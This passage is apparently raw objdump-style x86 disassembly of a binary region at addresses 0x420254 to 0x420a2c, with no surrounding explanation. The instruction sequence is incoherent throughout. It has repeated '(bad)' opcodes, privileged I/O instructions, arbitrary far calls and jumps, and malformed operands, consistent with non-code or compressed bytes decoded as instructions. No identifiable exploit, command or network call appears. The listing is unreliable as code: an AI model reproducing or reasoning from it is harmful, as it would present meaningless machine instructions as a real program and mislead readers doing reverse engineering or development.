  420254:	pusha  
  420255:	adc    BYTE PTR [esi-0x31],al
  420258:	enter  0xdf99,0xe6
  42025c:	xor    al,0x18
  42025e:	out    0x12,al
  420260:	fcmove st,st(5)
  420263:	push   cs
  420264:	mov    ah,0xc9
  420266:	inc    edx
  420267:	cdq    
  420268:	inc    ecx
  420269:	xor    BYTE PTR [esi-0x1d38ecc0],cl
  42026f:	dec    eax
  420270:	loop   0x4202c1
  420272:	mov    esi,0x58d7944
  420277:	pop    edx
  420278:	xor    dh,al
  42027a:	es out 0xc2,eax
  42027d:	inc    esi
  42027e:	dec    ebx
  42027f:	enter  0x9bd1,0xf8
  420283:	popa   
  420284:	fadd   QWORD PTR [edx-0x67e416e1]
  42028a:	sub    ebx,edx
  42028c:	(bad)  
  42028d:	pop    ds
  42028e:	ins    BYTE PTR es:[edi],dx
  42028f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420290:	push   ds
  420291:	cdq    
  420292:	pop    esi
  420293:	push   edi
  420294:	leave  
  420295:	call   0xe58908e
  42029a:	stos   DWORD PTR es:[edi],eax
  42029b:	mov    gs,WORD PTR es:[edi-0x56]
  42029f:	cmc    
  4202a0:	adc    BYTE PTR [ecx+ebp*2+0x13fd6606],al
  4202a7:	data16 outs dx,BYTE PTR ds:[esi]
  4202a9:	add    eax,0xda4388ad
  4202ae:	mov    esi,0xc748abc7
  4202b3:	int3   
  4202b4:	xchg   DWORD PTR [ebx],ebp
  4202b6:	sbb    BYTE PTR [esi+0x72],al
  4202b9:	push   edi
  4202ba:	xchg   edx,eax
  4202bb:	pop    esp
  4202bc:	js     0x420276
  4202be:	mov    cl,BYTE PTR [ebp+eax*1+0x58]
  4202c2:	pop    edi
  4202c3:	or     bh,0x70
  4202c6:	sub    al,0xe9
  4202c8:	lds    edi,FWORD PTR [edi]
  4202ca:	or     al,0xfc
  4202cc:	sbb    al,0x1f
  4202ce:	loopne 0x4202c1
  4202d0:	or     DWORD PTR [edx],0xf9d06080
  4202d6:	bound  esp,QWORD PTR [eax-0x6c3a3f1e]
  4202dc:	and    dl,BYTE PTR [ecx]
  4202de:	fstp   QWORD PTR ds:0x1cfdc7d
  4202e4:	sbb    ecx,DWORD PTR [edi]
  4202e6:	push   ss
  4202e7:	xor    BYTE PTR [ebp-0x556eda5f],0xca
  4202ee:	mov    ecx,0x66982bc7
  4202f3:	inc    esp
  4202f4:	pop    edx
  4202f5:	arpl   WORD PTR [esi+0x77],di
  4202f8:	mov    ebp,0x122691b2
  4202fd:	or     al,0xf4
  4202ff:	rcr    DWORD PTR [esi-0x1e07a2c8],cl
  420305:	cdq    
  420306:	xor    BYTE PTR [ecx-0x6e],dl
  420309:	in     al,0x1a
  42030b:	sub    bl,cl
  42030d:	dec    esp
  42030e:	bound  ecx,QWORD PTR [edi-0x5a]
  420311:	aaa    
  420312:	mov    bl,0x90
  420314:	pop    esi
  420315:	jae    0x420375
  420317:	cli    
  420318:	retf   0x3218
  42031b:	dec    ebp
  42031c:	mov    al,ds:0x1966119e
  420321:	sbb    ch,BYTE PTR [esi]
  420323:	mov    DWORD PTR [ebx+0x2308011c],0x5b07425b
  42032d:	inc    eax
  42032e:	and    al,0x71
  420330:	jnp    0x420323
  420332:	psubusb mm3,QWORD PTR [edi+edi*2]
  420336:	adc    DWORD PTR [edx-0xd93a19a],edx
  42033c:	mov    ?,WORD PTR [edx+edi*4+0x166a43ca]
  420343:	icebp  
  420344:	fs stc 
  420346:	cmp    eax,0x7215236d
  42034b:	in     al,0x12
  42034d:	daa    
  42034e:	call   0xedd5:0x64dd5e89
  420355:	popf   
  420356:	sub    cl,ch
  420358:	mov    edx,0xc9a46299
  42035d:	test   eax,0xaaf4609b
  420362:	and    BYTE PTR [edi+0x11],dh
  420365:	sbb    DWORD PTR [ecx-0x62],ebx
  420368:	cs popf 
  42036a:	cmp    cl,BYTE PTR [eax-0xcc3fad1]
  420370:	mov    bh,0x15
  420372:	out    0xf2,al
  420374:	ins    BYTE PTR es:[edi],dx
  420375:	xchg   ebp,eax
  420376:	mov    ds:0xcc84651e,eax
  42037b:	ror    ah,1
  42037d:	push   edi
  42037e:	mov    cl,BYTE PTR [esi-0x62e24724]
  420384:	jge    0x42032b
  420386:	xlat   BYTE PTR ds:[ebx]
  420387:	or     eax,0x26fb9cf4
  42038c:	push   edx
  42038d:	in     al,0x47
  42038f:	adc    BYTE PTR [ecx+ebx*1+0x27921c6d],cl
  420396:	icebp  
  420397:	fs into 
  420399:	clc    
  42039a:	or     al,0x93
  42039c:	cli    
  42039d:	inc    edx
  42039e:	pop    edi
  42039f:	xchg   cl,ah
  4203a1:	pop    ebp
  4203a2:	enter  0x6b2e,0x26
  4203a6:	mov    ds,WORD PTR [edi-0x1b]
  4203a9:	jl     0x4203b9
  4203ab:	fcomp  DWORD PTR [esp+edx*4]
  4203ae:	adc    edx,ebx
  4203b0:	jmp    DWORD PTR ss:[edi-0x72]
  4203b4:	bound  esi,QWORD PTR [edx+0x13]
  4203b7:	fild   QWORD PTR [esp+eax*4+0x2b]
  4203bb:	int3   
  4203bc:	loopne 0x4203b2
  4203be:	popf   
  4203bf:	das    
  4203c0:	repnz pop es
  4203c2:	push   ebp
  4203c3:	add    ah,ch
  4203c5:	std    
  4203c6:	jmp    0xf3ff:0xc3d4a17f
  4203cd:	dec    ebx
  4203ce:	pop    esi
  4203cf:	xor    DWORD PTR [ebx-0x1564e172],esi
  4203d5:	dec    ebx
  4203d6:	push   cs
  4203d7:	xchg   DWORD PTR [ecx+esi*8+0x2d],esp
  4203db:	pushf  
  4203dc:	xor    al,0x5f
  4203de:	dec    edx
  4203df:	sahf   
  4203e0:	mov    eax,0x342aa65b
  4203e5:	out    0x6a,eax
  4203e7:	adc    al,BYTE PTR [ecx+0xc]
  4203ea:	and    ecx,DWORD PTR [edi+ebp*1-0x2e]
  4203ee:	pop    ecx
  4203ef:	sbb    BYTE PTR [edi-0x60],bl
  4203f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f3:	and    DWORD PTR [esi-0x73dbfad4],ecx
  4203f9:	addr16 mov ah,0xba
  4203fc:	push   edx
  4203fd:	call   0xa48:0xee61d330
  420404:	dec    ebp
  420405:	push   esp
  420406:	inc    eax
  420407:	adc    dh,BYTE PTR [ecx-0x3c]
  42040a:	push   edi
  42040b:	mov    al,ds:0x110d4832
  420410:	fcmove st,st(6)
  420412:	mov    ah,0x82
  420414:	adc    al,0x18
  420416:	std    
  420417:	fcmovnb st,st(2)
  420419:	pop    ebp
  42041a:	xor    edi,DWORD PTR [eax-0x35]
  42041d:	addr16 dec edx
  42041f:	fld    TBYTE PTR [edx+0x75cbb198]
  420425:	ret    0x244
  420428:	fstp   QWORD PTR ds:0xae88
  42042d:	push   esi
  42042e:	adc    DWORD PTR [edx],eax
  420430:	push   ebx
  420431:	pusha  
  420432:	fwait
  420433:	push   edx
  420434:	mov    bh,BYTE PTR [edi+0x5bbf3334]
  42043a:	lods   eax,DWORD PTR ds:[esi]
  42043b:	ins    DWORD PTR es:[edi],dx
  42043c:	ins    BYTE PTR es:[edi],dx
  42043d:	arpl   WORD PTR [ebp-0x62],sp
  420440:	and    eax,0xaa3776b1
  420445:	and    bl,dh
  420447:	or     DWORD PTR es:[edi-0x68],eax
  42044b:	stc    
  42044c:	adc    eax,0x7068a4e7
  420451:	retf   
  420452:	or     BYTE PTR [esi-0x27333140],cl
  420458:	and    eax,0xe64609f
  42045d:	sbb    BYTE PTR [ebp+0x44],dh
  420460:	fidiv  DWORD PTR [ebp+0x74]
  420463:	nop
  420464:	inc    ebx
  420465:	push   cs
  420466:	dec    ebx
  420467:	enter  0x7b8b,0xe4
  42046b:	sbb    al,0x93
  42046d:	jp     0x4203fc
  42046f:	arpl   dx,si
  420471:	sub    BYTE PTR [eax+eiz*2-0x3dd85eed],dh
  420478:	mov    DWORD PTR [ebx+ecx*1-0x8],ecx
  42047c:	mov    al,ds:0xd7c3afa6
  420481:	test   al,0xcf
  420483:	cmp    ah,BYTE PTR [ebp-0x7b]
  420486:	test   BYTE PTR ds:[ecx],ah
  420489:	adc    eax,0x66598db6
  42048e:	fmulp  st(1),st
  420490:	sub    ch,BYTE PTR [eax]
  420492:	cdq    
  420493:	pop    ds
  420494:	addr16 mov esp,0xb42e5732
  42049a:	mov    bh,0x21
  42049c:	aas    
  42049d:	pop    es
  42049e:	sbb    eax,ebx
  4204a0:	pop    es
  4204a1:	cmp    eax,ebp
  4204a3:	or     DWORD PTR [edi],esp
  4204a5:	das    
  4204a6:	and    bl,cl
  4204a8:	mov    ah,0x3f
  4204aa:	ret    0xfe3b
  4204ad:	(bad)  
  4204ae:	out    0x9b,eax
  4204b0:	out    dx,eax
  4204b1:	cld    
  4204b2:	iret   
  4204b3:	jecxz  0x420518
  4204b5:	pop    ds
  4204b6:	sti    
  4204b7:	xchg   ebx,eax
  4204b8:	addr16 jl 0x4204fb
  4204bb:	mov    DWORD PTR [edi],0xbd060087
  4204c1:	or     edi,DWORD PTR [esi-0x15]
  4204c4:	leave  
  4204c5:	idiv   DWORD PTR [ebx-0x1d]
  4204c8:	push   es
  4204c9:	adc    bh,cl
  4204cb:	fsub   DWORD PTR [esi+0x1600c21e]
  4204d1:	pop    edx
  4204d2:	mov    ds:0xf202cf3f,eax
  4204d7:	mov    ebp,0x67933ce1
  4204dc:	popf   
  4204dd:	out    0xda,al
  4204df:	dec    esp
  4204e0:	push   ss
  4204e1:	shl    DWORD PTR [ebx],0xd2
  4204e4:	aam    0x85
  4204e6:	outs   dx,BYTE PTR ds:[esi]
  4204e7:	push   esi
  4204e8:	ret    
  4204e9:	dec    ebx
  4204ea:	jbe    0x42048d
  4204ec:	adc    BYTE PTR [ebx-0x3d232488],bl
  4204f2:	lea    edx,[ebp*1-0x19c273ec]
  4204f9:	inc    edi
  4204fa:	cli    
  4204fb:	outs   dx,DWORD PTR ds:[esi]
  4204fc:	adc    ch,BYTE PTR [ebp+0x2e]
  4204ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420500:	add    ebp,DWORD PTR [ebx+ebp*8+0x67]
  420504:	imul   edi,eax,0xd4fa9e28
  42050a:	iret   
  42050b:	jge    0x420513
  42050d:	xchg   edx,eax
  42050e:	xchg   ecx,eax
  42050f:	sub    dl,bl
  420511:	cmp    al,0x25
  420513:	addr16 jp 0x420507
  420516:	inc    edx
  420517:	retf   
  420518:	fbld   TBYTE PTR [edx+0x5b]
  42051b:	mov    ebx,0x76610d11
  420520:	sbb    DWORD PTR [esi+0x79a9f7d8],edi
  420526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420527:	mov    WORD PTR [edx+ebp*8],ds
  42052a:	rcpps  xmm2,XMMWORD PTR [ebx+0x733e64d0]
  420531:	loope  0x4204ec
  420533:	push   0x27a2932
  420538:	mov    bl,0xbf
  42053a:	mov    ebp,0x5d312f68
  42053f:	enter  0x2d9f,0xcc
  420543:	jmp    0x4bcd:0x80630ef9
  42054a:	rol    bl,0x76
  42054d:	dec    edx
  42054e:	mov    dh,0x9e
  420550:	in     eax,dx
  420551:	int3   
  420552:	or     BYTE PTR [ecx+0x47],dh
  420555:	fwait
  420556:	sub    cl,BYTE PTR [edi]
  420558:	mov    ebp,0xbce7b25b
  42055d:	iret   
  42055e:	out    dx,eax
  42055f:	xchg   BYTE PTR [eax],cl
  420561:	xchg   esp,eax
  420562:	rcl    eax,1
  420564:	imul   edi,DWORD PTR [esi+0x4e],0xa5f30e46
  42056b:	loopne 0x420538
  42056d:	cmc    
  42056e:	pop    ecx
  42056f:	sub    bh,cl
  420571:	adc    BYTE PTR [esi+eax*2-0x12],ch
  420575:	pop    esp
  420576:	push   ebp
  420577:	mov    cs,WORD PTR [ecx+0x24]
  42057a:	out    0x99,eax
  42057c:	icebp  
  42057d:	clc    
  42057e:	add    eax,0xd9e4aaf0
  420583:	mov    ds:0xf14b5ebe,eax
  420588:	imul   esp,DWORD PTR [ebx+eax*2-0x17210119],0x98c3c2ef
  420593:	mov    ecx,0xb764d491
  420598:	pop    ss
  420599:	and    BYTE PTR [ebp+0x60],0x73
  42059d:	imul   ebp,DWORD PTR [edx],0xdf47f163
  4205a3:	sbb    esp,ebp
  4205a5:	cwde   
  4205a6:	mov    dl,0x22
  4205a8:	adc    ch,cl
  4205aa:	pop    esp
  4205ab:	mov    BYTE PTR [ebx],dh
  4205ad:	pop    esp
  4205ae:	daa    
  4205af:	mov    esi,DWORD PTR ds:0x77bd9216
  4205b5:	jle    0x4205b7
  4205b7:	clc    
  4205b8:	mov    edi,0xf8e80f8
  4205bd:	dec    esi
  4205be:	add    BYTE PTR [esp+edi*8-0x4f7de83a],bh
  4205c5:	pop    edi
  4205c6:	test   BYTE PTR [ebx+edx*4],0x59
  4205ca:	call   0xae8509f9
  4205cf:	mov    ecx,0x8d3675d
  4205d4:	mov    eax,ds:0xdd717caa
  4205d9:	pushw  ss
  4205db:	mov    dl,0x70
  4205dd:	div    BYTE PTR [edi+0x11]
  4205e0:	or     al,0xa2
  4205e2:	and    DWORD PTR [ebp+0x2c7b6def],ebx
  4205e8:	popa   
  4205e9:	sbb    BYTE PTR [ebx+0x5f],dh
  4205ec:	and    al,0x84
  4205ee:	sbb    BYTE PTR [ebx+0x55],ah
  4205f1:	ins    BYTE PTR es:[edi],dx
  4205f2:	out    0x10,al
  4205f4:	xchg   esp,eax
  4205f5:	lahf   
  4205f6:	call   0x6b9702ea
  4205fb:	jnp    0x42057e
  4205fd:	enter  0xa69,0x69
  420601:	add    BYTE PTR [ecx-0x37bcfc60],dl
  420607:	mov    dl,0x83
  420609:	ins    DWORD PTR es:[edi],dx
  42060a:	or     dh,BYTE PTR [esi+0xa7c5944]
  420610:	scas   eax,DWORD PTR es:[edi]
  420611:	push   0x6e
  420613:	or     DWORD PTR [ecx-0x3b],ebx
  420616:	loop   0x4205d4
  420618:	push   edx
  420619:	jns    0x42068a
  42061b:	add    BYTE PTR [edi+0x2b],dh
  42061e:	imul   ebp,DWORD PTR [ecx],0x4a
  420621:	adc    bh,BYTE PTR [ebx]
  420623:	ficom  WORD PTR [ebx+0x319cab7b]
  420629:	fstp   st(6)
  42062b:	test   DWORD PTR [edx+0x4189093],edx
  420631:	xchg   ecx,eax
  420632:	mov    eax,ds:0xd91a2407
  420637:	ins    DWORD PTR es:[edi],dx
  420638:	stc    
  420639:	in     eax,0xda
  42063b:	mov    al,0xdf
  42063d:	add    eax,0xe19c955
  420642:	repz mov ebx,0xe72809ed
  420648:	or     ah,BYTE PTR [edi+edx*4+0x35]
  42064c:	adc    edi,eax
  42064e:	call   0xebb1:0xafc969ab
  420655:	addr16 xchg esp,eax
  420657:	adc    al,0x80
  42065a:	xor    BYTE PTR [ebp+0x6118f1fd],dh
  420660:	dec    edx
  420661:	jo     0x4206df
  420663:	add    ecx,edi
  420665:	push   edx
  420666:	pop    ebx
  420667:	xor    al,0xa3
  420669:	cmp    al,0xcd
  42066b:	in     al,dx
  42066c:	mov    esi,0x4299fad1
  420671:	out    0x88,eax
  420673:	sub    BYTE PTR [eax+0x4d37105b],cl
  420679:	in     al,0xc2
  42067b:	inc    esp
  42067c:	add    BYTE PTR [edx+0x7dcbe957],dh
  420682:	pop    ds
  420683:	xlat   BYTE PTR ds:[ebx]
  420684:	mov    dh,0x32
  420686:	jmp    0x42066d
  420688:	rcr    BYTE PTR [ecx+0x6112328],cl
  42068e:	repnz push cs
  420690:	add    al,BYTE PTR [esi+0x10d6873c]
  420696:	mov    bl,0x22
  420698:	sbb    edi,DWORD PTR [ebp+0x1e]
  42069b:	data16 fisttp QWORD PTR [eax-0x3f]
  42069f:	or     esi,DWORD PTR [ebx]
  4206a1:	aam    0xe9
  4206a3:	sbb    DWORD PTR [edi],0xffffffe3
  4206a6:	cpuid  
  4206a8:	add    BYTE PTR [eax],cl
  4206aa:	mov    bl,0xc1
  4206ac:	pop    ss
  4206ad:	sub    BYTE PTR [eax],0xcb
  4206b0:	in     eax,dx
  4206b1:	sub    eax,DWORD PTR [edi+0x11c6dc30]
  4206b7:	xchg   edx,eax
  4206b8:	adc    ebp,DWORD PTR [edi]
  4206ba:	int3   
  4206bb:	lea    esp,cs:0x6390926c
  4206c2:	xchg   edi,eax
  4206c3:	pop    edx
  4206c4:	fs and eax,0xb23dcbd0
  4206ca:	pushf  
  4206cb:	add    BYTE PTR [ebp-0x4aa93a38],0x55
  4206d2:	pop    ecx
  4206d3:	loop   0x420659
  4206d5:	xchg   ecx,eax
  4206d6:	add    eax,0x6b0880f2
  4206db:	or     ah,BYTE PTR [ebx+eax*8-0x64]
  4206df:	push   eax
  4206e0:	mov    ebp,0xed3bfea2
  4206e5:	imul   esp,esp,0xccf1e320
  4206eb:	cwde   
  4206ec:	and    al,0xc7
  4206ee:	fidiv  WORD PTR [edi]
  4206f0:	and    BYTE PTR [eax],0x8c
  4206f3:	mov    al,0xb1
  4206f5:	in     eax,dx
  4206f6:	les    ebp,FWORD PTR [edx+edi*2]
  4206f9:	call   0xeba9498d
  4206fe:	or     al,0x24
  420700:	xlat   BYTE PTR ds:[ebx]
  420701:	out    dx,al
  420702:	rcr    ch,cl
  420704:	push   edi
  420705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420706:	xchg   edx,esi
  420708:	inc    esi
  420709:	xchg   ebx,eax
  42070a:	jl     0x42073e
  42070c:	out    0xf7,eax
  42070e:	les    ecx,FWORD PTR [eax]
  420710:	add    dl,BYTE PTR [esi+ebp*8+0x55]
  420714:	pop    ds
  420715:	cdq    
  420716:	add    dl,cl
  420718:	ds in  al,0x10
  42071b:	pop    edi
  42071c:	test   eax,0xec8939bc
  420721:	xchg   edi,eax
  420722:	and    dl,bl
  420724:	fld    QWORD PTR [esi+0x6991d2fb]
  42072a:	xor    al,0x13
  42072c:	mov    ?,WORD PTR [ebp-0x480ccdd9]
  420732:	inc    ebp
  420733:	arpl   dx,sp
  420735:	in     al,0x7a
  420737:	test   DWORD PTR [ecx+0x5dcdde71],edx
  42073d:	inc    ebx
  42073e:	xor    al,BYTE PTR [esi-0x6d]
  420741:	ins    DWORD PTR es:[edi],dx
  420742:	int3   
  420743:	sti    
  420744:	js     0x420787
  420746:	(bad)  
  420747:	sub    BYTE PTR [ebp-0x2e],ah
  42074a:	push   0xffffff85
  42074c:	push   cs
  42074d:	add    al,0x66
  42074f:	jnp    0x42073f
  420751:	repz fs ds int3 
  420755:	inc    ebp
  420756:	sub    dl,ah
  420758:	pop    edx
  420759:	aas    
  42075a:	xor    ebx,DWORD PTR [ecx]
  42075c:	mov    al,ds:0xfb4f7de2
  420761:	nop
  420762:	je     0x420784
  420764:	in     eax,dx
  420765:	cmp    ch,bh
  420767:	adc    BYTE PTR [ebx],bl
  420769:	shl    DWORD PTR [eax-0x22],0x57
  42076d:	(bad)  
  42076e:	xchg   ebx,eax
  42076f:	loope  0x4207a1
  420771:	mov    dh,0xd0
  420773:	(bad)  
  420774:	arpl   WORD PTR [esi-0x8359828],ax
  42077a:	push   cs
  42077b:	push   esp
  42077c:	sbb    BYTE PTR [ecx+0x4],al
  42077f:	adc    BYTE PTR [edx],0xe4
  420782:	cmp    bh,BYTE PTR [edi]
  420784:	pop    edi
  420785:	dec    edi
  420786:	push   edi
  420787:	fdivr  DWORD PTR [edx+0x4217af26]
  42078d:	sar    BYTE PTR [edi-0x7],1
  420790:	stc    
  420791:	out    0xd7,al
  420793:	(bad)  
  420794:	fnclex 
  420796:	fsub   DWORD PTR [edi+0x1f1eb3fe]
  42079c:	shl    cl,0x81
  42079f:	or     BYTE PTR [eax+0x13fa5ffd],al
  4207a5:	xchg   ebx,eax
  4207a6:	jmp    0xc49b:0xce7ecfc1
  4207ad:	mov    esi,0x29c364b4
  4207b2:	sbb    al,0x4d
  4207b4:	and    DWORD PTR [edx-0x2a],edx
  4207b7:	sbb    al,0x92
  4207b9:	jo     0x4207dc
  4207bb:	out    0x64,eax
  4207bd:	sub    DWORD PTR [esi-0x27159035],esi
  4207c3:	mov    cl,BYTE PTR [edx+0x34]
  4207c6:	cdq    
  4207c7:	stos   DWORD PTR es:[edi],eax
  4207c8:	add    eax,0x3aafc21a
  4207ce:	adc    al,0xf5
  4207d0:	int    0xb1
  4207d2:	fiadd  DWORD PTR [edi]
  4207d4:	shl    ch,1
  4207d6:	(bad)  
  4207d7:	cmp    eax,0x62cc7023
  4207dc:	adc    BYTE PTR [eax-0x7593fa9],al
  4207e2:	or     al,BYTE PTR [ecx-0x1993fc9a]
  4207e8:	popa   
  4207e9:	out    0x2c,al
  4207eb:	mov    ds:0x52126a6f,al
  4207f0:	leave  
  4207f1:	and    BYTE PTR [esp+eax*8],dh
  4207f4:	push   ss
  4207f5:	stos   BYTE PTR es:[edi],al
  4207f6:	cld    
  4207f7:	xor    edi,DWORD PTR [ebx]
  4207f9:	xor    al,0xa5
  4207fb:	lods   eax,DWORD PTR ds:[esi]
  4207fc:	or     al,0xb7
  4207fe:	outs   dx,DWORD PTR ds:[esi]
  4207ff:	lahf   
  420800:	in     eax,dx
  420801:	mov    ebx,gs
  420803:	push   0x5edf3706
  420808:	pushf  
  420809:	pop    ebp
  42080a:	mov    dh,0xec
  42080c:	aad    0x77
  42080e:	inc    eax
  42080f:	push   edx
  420810:	push   0x8
  420812:	fild   WORD PTR [ecx+0x3f]
  420815:	and    ch,BYTE PTR [eax+0x7c]
  420818:	xchg   DWORD PTR [ecx],ebx
  42081a:	rcr    eax,0xf1
  42081d:	push   ds
  42081e:	ss neg edi
  420821:	jne    0x42081f
  420823:	mov    DWORD PTR [eax-0x33a79e4c],eax
  420829:	xor    esp,ebx
  42082b:	shl    DWORD PTR [ebx-0x1c],1
  42082e:	fnstenv [esi]
  420830:	das    
  420831:	inc    ebx
  420832:	(bad)  
  420833:	imul   eax,DWORD PTR [ebx+ebx*4],0xfa337b8d
  42083a:	or     al,0xeb
  42083c:	xor    bl,dh
  42083e:	sbb    cl,cl
  420840:	stos   BYTE PTR es:[edi],al
  420841:	adc    eax,DWORD PTR [ecx+0x66e6e36e]
  420847:	or     eax,0x77cdcd5e
  42084c:	ja     0x4207d3
  42084e:	push   ss
  42084f:	mov    bl,0xcd
  420851:	xor    ebx,DWORD PTR [ebx+0x7cc8a89b]
  420857:	addr16 sahf 
  420859:	lahf   
  42085a:	es nop
  42085c:	xor    al,0x8c
  42085e:	or     edi,esp
  420860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420861:	cmp    ebp,DWORD PTR [ebx]
  420863:	add    eax,0x70fb157e
  420868:	ja     0x420875
  42086a:	scas   eax,DWORD PTR es:[edi]
  42086b:	or     al,0xf2
  42086d:	sahf   
  42086e:	xchg   edx,eax
  42086f:	xor    DWORD PTR [ecx],edi
  420871:	repz sbb edi,DWORD PTR [edx+0x53]
  420875:	push   ds
  420876:	stc    
  420877:	(bad)  
  420878:	outs   dx,BYTE PTR ds:[esi]
  420879:	es cmp edx,ebp
  42087c:	inc    esi
  42087d:	or     ebx,DWORD PTR [ecx+eiz*1]
  420880:	addr16 jge 0x4208d4
  420883:	sbb    ax,0x82ad
  420887:	adc    DWORD PTR [eax+eiz*8],edx
  42088a:	or     dl,BYTE PTR [eax]
  42088c:	inc    ecx
  42088d:	cmp    DWORD PTR [eax-0x36432229],eax
  420893:	mov    al,0xf1
  420895:	ss lock xor eax,0x3e3803e
  42089c:	adc    DWORD PTR [eax],eax
  42089e:	stos   BYTE PTR es:[edi],al
  42089f:	aad    0xf8
  4208a1:	ret    
  4208a2:	popa   
  4208a3:	rcr    BYTE PTR [edi+0x4db75896],1
  4208a9:	in     al,0x81
  4208ab:	adc    DWORD PTR [ebx],edi
  4208ad:	leave  
  4208ae:	fidivr DWORD PTR [edi+0x3320166]
  4208b4:	mov    ebx,0xa67fde6d
  4208b9:	inc    edi
  4208ba:	lods   al,BYTE PTR ds:[esi]
  4208bb:	xor    BYTE PTR [edi+ebp*2+0x34],cl
  4208bf:	inc    edx
  4208c0:	dec    edx
  4208c1:	cs jge 0x420909
  4208c4:	sbb    BYTE PTR [eax-0x1f],bl
  4208c7:	and    DWORD PTR [edx+0x4a8ac1dd],edx
  4208cd:	mov    ah,0xab
  4208cf:	test   BYTE PTR [esi+0x6],dh
  4208d2:	nop
  4208d3:	pushf  
  4208d4:	out    0xcc,al
  4208d6:	lahf   
  4208d7:	bound  eax,QWORD PTR [ebx+edx*4+0x7c3a440f]
  4208de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208df:	arpl   WORD PTR [ecx-0x66],bp
  4208e2:	pop    eax
  4208e3:	rcr    BYTE PTR [esi+0x5b380346],cl
  4208e9:	arpl   WORD PTR [ecx-0x24f7411b],dx
  4208ef:	push   esp
  4208f0:	push   ebx
  4208f1:	pusha  
  4208f2:	fs stos BYTE PTR es:[edi],al
  4208f4:	jge    0x4208fb
  4208f6:	loop   0x42087c
  4208f8:	xchg   ebx,eax
  4208f9:	ja     0x420892
  4208fb:	rcr    BYTE PTR [edx+0x5f],cl
  4208fe:	dec    esp
  4208ff:	push   ds
  420900:	xor    esi,DWORD PTR [esi]
  420902:	fld    DWORD PTR [edi-0x25cd6c0]
  420908:	sbb    eax,0x9a781bac
  42090d:	cs ins DWORD PTR es:[edi],dx
  42090f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420910:	pushf  
  420911:	jns    0x420897
  420913:	fild   DWORD PTR [esp+eax*2]
  420916:	out    dx,al
  420917:	ins    DWORD PTR es:[edi],dx
  420918:	ins    DWORD PTR es:[edi],dx
  420919:	pop    ecx
  42091a:	popa   
  42091b:	dec    esi
  42091c:	mov    al,0x3d
  42091e:	pop    es
  42091f:	sbb    al,0x59
  420921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420922:	dec    ebp
  420923:	adc    ebp,DWORD PTR [edi]
  420925:	inc    edi
  420926:	push   ss
  420927:	xor    cl,BYTE PTR [edi-0xa]
  42092a:	out    0xca,al
  42092c:	mov    cl,0xb3
  42092e:	sbb    ebp,edi
  420930:	fld    QWORD PTR [esi-0x573fbafe]
  420936:	sbb    al,0x55
  420938:	sub    BYTE PTR [eax+0x43247990],dh
  42093e:	rcl    ecx,cl
  420940:	mov    esi,gs
  420942:	(bad)  
  420944:	push   0x8bddf971
  420949:	inc    esi
  42094a:	xor    eax,0xa900a0a8
  42094f:	push   edi
  420950:	adc    ah,al
  420952:	popfw  
  420954:	mov    ebx,0x136979e6
  420959:	mov    dl,0x9e
  42095b:	into   
  42095c:	test   eax,0x82b03590
  420961:	dec    eax
  420962:	dec    esi
  420963:	sub    edx,DWORD PTR [ecx+0x44a3002b]
  420969:	inc    esp
  42096a:	mov    al,ds:0x52799cc9
  42096f:	call   0x9ba6:0xb202b4ae
  420976:	lods   al,BYTE PTR ds:[esi]
  420977:	lahf   
  420978:	adc    DWORD PTR [edx],ecx
  42097a:	and    dl,BYTE PTR [esp+eax*1-0x1b9181a]
  420981:	call   0xf2cdf441
  420986:	cmp    DWORD PTR [ecx-0x5c5dec8d],esi
  42098c:	push   eax
  42098d:	dec    edx
  42098e:	aas    
  42098f:	sar    DWORD PTR [ebx],cl
  420991:	(bad)  
  420993:	xor    bh,BYTE PTR [edi-0x70]
  420996:	add    al,0x40
  420998:	nop
  420999:	je     0x42095a
  42099b:	adc    BYTE PTR [ecx+ebx*2+0xe],al
  42099f:	ror    DWORD PTR [ebp-0x7f80eff0],0x6b
  4209a6:	enter  0xb9d9,0x4a
  4209aa:	jae    0x42092e
  4209ac:	add    BYTE PTR [esi+0x6c],al
  4209af:	dec    BYTE PTR [ebx+eax*8]
  4209b2:	fdiv   DWORD PTR [edx-0x67]
  4209b5:	jecxz  0x4209f4
  4209b7:	xchg   edi,eax
  4209b8:	dec    eax
  4209b9:	cmp    BYTE PTR [edi+ebp*2+0x1d],0x50
  4209be:	sub    bl,BYTE PTR [edi+0x5c]
  4209c1:	xor    ch,BYTE PTR [ebp-0x6e2ba2d3]
  4209c7:	(bad)  
  4209c8:	mov    WORD PTR [esi+0x27],fs
  4209cb:	bound  edx,QWORD PTR [esi]
  4209cd:	jl     0x4209cf
  4209cf:	leave  
  4209d0:	cmp    DWORD PTR [ebx+esi*4],eax
  4209d3:	pop    eax
  4209d4:	test   eax,0xc09a87ed
  4209d9:	shl    BYTE PTR [ecx],cl
  4209db:	jns    0x420a28
  4209dd:	and    DWORD PTR [edi-0x7afcce00],eax
  4209e3:	(bad)
  4209e6:	mov    al,0xda
  4209e8:	fcmovbe st,st(4)
  4209ea:	cdq    
  4209eb:	jle    0x420a0c
  4209ed:	xor    DWORD PTR [ecx],edx
  4209ef:	ins    BYTE PTR es:[edi],dx
  4209f0:	lsl    esi,WORD PTR [ebx-0x73]
  4209f4:	adc    BYTE PTR [edx+0x6a],bh
  4209f7:	mov    dl,0xfb
  4209f9:	in     al,0xde
  4209fb:	xchg   edx,eax
  4209fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209fd:	adc    bl,BYTE PTR [eax+0x23275871]
  420a03:	mov    ecx,0x1afbb1c6
  420a08:	test   al,0xfc
  420a0a:	(bad)  [esi+eiz*2+0x6c2ffb43]
  420a11:	retf   
  420a12:	ins    DWORD PTR es:[edi],dx
  420a13:	sbb    cl,bl
  420a15:	inc    ebx
  420a16:	pusha  
  420a17:	and    al,0xa1
  420a19:	inc    edi
  420a1a:	mov    esi,0x48f33957
  420a1f:	dec    ebp
  420a20:	mov    ebp,0x51b70908
  420a25:	jmp    0x420a2f
  420a27:	ror    DWORD PTR [ebx],0xa3
  420a2a:	stos   BYTE PTR es:[edi],al
  420a2b:	pop    esp
  420a2c:	xor    cl,cl
